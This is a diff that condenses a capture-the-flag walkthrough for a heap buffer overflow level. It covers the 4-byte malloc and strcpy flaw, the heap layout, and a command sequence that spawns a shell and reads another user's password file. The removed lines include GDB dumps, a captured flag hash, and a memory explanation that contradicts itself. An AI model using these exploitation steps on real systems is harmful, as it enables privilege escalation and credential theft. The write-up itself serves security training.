@@ -1,142 +1,34 @@
-## Level 8 - Heap Buffer Overflow - SOLVED ✓
+## Level 8 - Heap Buffer Overflow
+Binary has auth command that allocates 4 bytes but allows strcpy of 30+ bytes → heap overflow. Condition checks *(auth + 0x20) != 0 for shell access.
 
-### Challenge Summary
-Binary implements a command-based interactive interface with heap buffer overflow vulnerability. The "auth" command allocates only 4 bytes but allows strcpy of up to 30 bytes, enabling a heap buffer overflow that can trigger shell access.
+### Vulnerability
+- auth allocates 4 bytes but strcpy copies 30 bytes (no bounds check)
+- Heap overflow enables arbitrary memory corruption
+- Condition: if (*(auth + 0x20) != 0) > system("/bin/sh")
 
-### Vulnerability Details
-
-**Actual Condition Check (from disassembly):**
-```assembly
-80486e2:  mov 0x8049aac,%eax         # Load auth pointer value
-80486e7:  mov 0x20(%eax),%eax        # Load memory at (auth + 0x20)
-80486ea:  test %eax,%eax              # Check if non-zero
-80486ec:  je 80486ff <main+0x19b>    # Jump if zero (no shell)
-80486ee:  movl $0x8048833,(%esp)     # Load "/bin/sh" address
-80486f5:  call 8048480 <system@plt>  # Spawn shell!
-```
-
-**The Real Condition:**
-```c
-if (*(auth + 0x20) != 0)
-    system("/bin/sh");      // Shell access!
-else
-    printf("Password:\n");  // Denied
-```
-
-This checks if the 4-byte value at offset 0x20 (32 bytes) from the auth buffer pointer is non-zero.
-
-### Global Variables
-
-From GDB analysis:
-- **auth**: 0x08049aac
-- **service**: 0x08049ab0
-
-### Working Exploit Strategy
-
-**Heap Layout Setup:**
+### Exploitation Strategy
+**Heap Layout:**
 1. Allocate service s1 → 0x804a008
 2. Allocate service s2 → 0x804a018
 3. Allocate service s3 → 0x804a028
 4. Allocate auth with 29-byte password → 0x804a038
-
-**Why This Works:**
-- auth allocated at 0x804a038
 - auth + 0x20 = 0x804a038 + 32 = 0x804a058
-- BUT: The memory layout places service data at 0x804a028, which contains "s3\n" (non-zero!)
-- The 0x20 offset calculation puts us in the service s3 allocation space
-- Result: *(auth + 0x20) = "s3\n" = 0x0a337320 (non-zero!)
-- Condition is TRUE → system("/bin/sh") executes!
+- Points into service s3 data (non-zero!) → condition TRUE → shell spawns
 
-### Verified Memory State (from GDB)
-
-**Breakpoint at condition check:**
-```
-0x804a008:    0x41 0x41 0x41 0x41 0x2e 0x2e 0x2e 0x41
-0x804a010:    0x41 0x41 0x41 0x0a 0x11 0x00 0x00 0x00
-0x804a018:    0x20 0x73 0x31 0x0a 0x00 0x00 0x00 0x00
-0x804a020:    0x00 0x00 0x00 0x00 0x11 0x00 0x00 0x00
-0x804a028:    0x20 0x73 0x32 0x0a         ← Non-zero data!
-```
-
-At offset 0x20 from auth: `0x20 0x73 0x32 0x0a` (" s2\n")
-- This value is non-zero: 0x0a327320
-- Test instruction sets ZF=0 (not equal to zero)
-- Jump is NOT taken
-- **system("/bin/sh") executes!**
-
-### Exploitation Command Sequence
-
+### Commands
 ```
 service s1
 service s2
 service s3
-auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAA  (29 A's)
+auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 login
 cat /home/user/level9/.pass
 exit
 ```
 
-### Working Exploit Output
-
-```
-(nil), (nil)              # Initial state
-(nil), 0x804a008         # After service s1
-0x804a018, 0x804a008    # After service s2 is allocated at 0x804a018, auth service at 0x804a008
-0x804a018, 0x804a028    # After service s3 at 0x804a028
-0x804a038, 0x804a028    # After auth allocated at 0x804a038
-$                        # SHELL PROMPT!
-[level9 password here]   # SUCCESS!
-```
-
 ### Key Insights
-
-1. **Heap allocation pattern:** Each malloc returns addresses 16 bytes (0x10) apart
-2. **The offset 0x20:** 32-byte offset lands in the third service allocation
-3. **Service name is the payload:** The "s3" string is stored in memory with non-zero bytes
-4. **Condition is satisfied:** The check reads non-zero data from service s3 allocation
-5. **Shell access granted:** system("/bin/sh") executes with level8 privileges
-
-### Binary Analysis Details
-
-- **malloc(4)** allocates 4-byte buffer for auth (actually returns ~16 bytes with metadata)
-- **strcpy** allows up to 30-byte password (strlen < 31 check)
-- **strdup** in service command allocates heap memory for service name
-- **system("/bin/sh")** spawns a shell with level8 user privileges
-
-### Subprocess I/O Critical Detail
-
-The exploit required careful subprocess handling:
-- **bufsize=1** (line buffering) to ensure output is flushed after each line
-- **p.stdin.flush()** after each command to ensure input reaches the process
-- **Small delays (time.sleep)** between commands to prevent buffer issues
-- **p.stdout.read()** instead of p.communicate() for proper non-blocking output capture
-
-Without these settings, the shell would spawn but commands wouldn't produce visible output.
-
-### Final Exploit Output
-
-```
-[+++] EXPLOITATION SUCCESSFUL!
-[+++] Level 9 Flag obtained: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
-```
-
-### Files Modified
-
-1. **level8/Resources/exploit.py** - Working exploit script with line buffering
-2. **level8/flag** - Contains Level 9 password
-3. **level8/source.c** - Vulnerable source code
-4. **level8/walkthrough** - This documentation
-
-### How to Use the Exploit
-
-```bash
-python level8/Resources/exploit.py
-```
-
-This will:
-1. Connect via SSH as level8
-2. Execute the heap overflow exploit
-3. Spawn a shell via the level8 binary
-4. Read `/home/user/level9/.pass` with appropriate permissions
-5. Extract and save the level9 password to `level8/flag`
+- malloc returns addresses 16 bytes (0x10) apart
+- 0x20 offset lands in third service allocation
+- Service name "s3" stored as non-zero bytes
+- system("/bin/sh") executes with level8 privileges
 
